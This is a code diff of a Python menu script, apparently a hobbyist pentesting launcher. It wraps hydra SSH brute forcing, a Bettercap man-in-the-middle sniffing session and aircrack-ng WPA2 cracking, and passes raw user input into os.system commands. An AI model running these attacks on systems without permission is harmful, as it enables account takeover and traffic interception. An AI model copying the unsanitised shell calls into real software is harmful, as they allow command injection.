@@ -35,29 +35,43 @@ while True:
  print(f"{LIGHT_WHITE}[4] Man In The Middle - Bettercap")
  print(f"{LIGHT_PURPLE}[5] {LIGHT_BLUE}Crack {LIGHT_WHITE}Wpa2{LIGHT_BLUE} Passwords - aircrack-ng ")
  print(f"\n{LIGHT_PURPLE}Remember {LIGHT_WHITE}Ctrl+C{LIGHT_PURPLE} Will Bring You Back, {LIGHT_GREEN}ONLY WHEN IN TOOL SCREEN")
+ 
  def hydra():
-  print("\n[1] ssh password brute force")
-  print("[2] ssh username brute force")
-  print("[3] ssh username & password brute force\n")
-  choice = input("Answer: ")
-  if choice == "1":
-   passwd_list = input(f"Enter Your Password List: ")
-   username = input(f"Enter Your Target Username: ")
-   host_ip = input(f"Enter Host_IP: ")
-   threads = input(f"Enter The Amount of Threads: ")
-   os.system(f'hydra -l {username} -P {passwd_list} -t {threads} ssh://{host_ip}')
-  elif choice == "2":
-   passwd = input(f"Targets Password: ")
-   username_list = input(f"Enter Your Username list: ")
-   host_ip = input(f"Enter Host_IP: ")
-   threads = input(f"Enter The Amount of Threads: ")
-   os.system(f'hydra -L {username_list} -p {passwd} -t {threads} ssh://{host_ip}')
-  elif choice == "3":
-   pass_list = input(f"Enter Your Password list: ")
-   user_list = input(f"Enter Your Username list: ")
-   host_ip = input(f"Enter Host_IP: ")
-   threads = input(f"Enter The Amount of Threads: ")
-   os.system(f'hydra -L {user_list} -P {pass_list} -t {threads} ssh://{host_ip}')
+   print("\n[1] ssh password brute force")
+   print("[2] ssh username brute force")
+   print("[3] ssh username & password brute force\n")
+   while True:
+    choice = input("Answer: ")
+    if choice == "1":
+     passwd_list = input(f"Enter Your Password List: ")
+     if passwd_list == "show":
+      check = input(f"Enter Your .txt Name: {LIGHT_GREEN}")
+      os.system(f"locate {check}")
+     else:
+      username = input(f"Enter Your Target Username: ")
+      host_ip = input(f"Enter Host_IP: ")
+      threads = input(f"Enter The Amount of Threads: ")
+      os.system(f'hydra -l {username} -P {passwd_list} -t {threads} ssh://{host_ip}')
+    elif choice == "2":
+     passwd = input(f"Enter Your Target Username: ")
+     if passwd == "show":
+      check = input(f"Enter Your .txt Name: {LIGHT_GREEN} ")
+      os.system(f"locate {check}")
+     else:
+      username_list = input(f"Enter Your Username list: ")
+      host_ip = input(f"Enter Host_IP: ")
+      threads = input(f"Enter The Amount of Threads: ")
+      os.system(f'hydra -L {username_list} -p {passwd} -t {threads} ssh://{host_ip}')
+    elif choice == "3":
+     pass_list = input(f"Enter Your Password list: ")
+     if pass_list == "show":
+      check = input(f"Enter Your .txt Name: {LIGHT_GREEN}")
+      os.system(f"locate {check}")
+     else:
+      user_list = input(f"Enter Your Username list: ")
+      host_ip = input(f"Enter Host_IP: ")
+      threads = input(f"Enter The Amount of Threads: ")
+      os.system(f'hydra -L {user_list} -P {pass_list} -t {threads} ssh://{host_ip}')
  which = input(f"{LIGHT_RED}Which One:{LIGHT_WHITE} ")
  if which == "1":
   interface = input(f"Enter Your Interface: ")
@@ -84,10 +98,13 @@ while True:
   os.system(f"sudo bettercap -iface {inf} -eval 'net.sniff on; https.proxy on; net.probe on'")
  elif which == "5":
   aircrack = input("Enter Your Password List, OR Type 'show' to locate wordlist: ")
- if aircrack == "show":
-  locate = input("Locate Your Wordlist, Enter .txt Name: ")
-  os.system(f"locate {locate}")
- else:
-  pcap = input("Enter Your .Pcap File: ")
-  os.system(f"aircrack-ng -w {aircrack} {pcap}")
+  if aircrack == "show":
+   locate = input(f"Locate Your Wordlist, Enter .txt Name: {LIGHT_GREEN} ")
+   os.system(f"locate {locate}")
+  else:
+   pcap = input("Enter Your .Pcap File, OR Type 'find' To Check Your Dir For The pcap File: ")
+   if pcap == "find":
+    os.system("ls")
+    pcap = input(f"Enter Your .Pcap File: {LIGHT_GREEN} ")
+   os.system(f"aircrack-ng -w {aircrack} {pcap}")
 
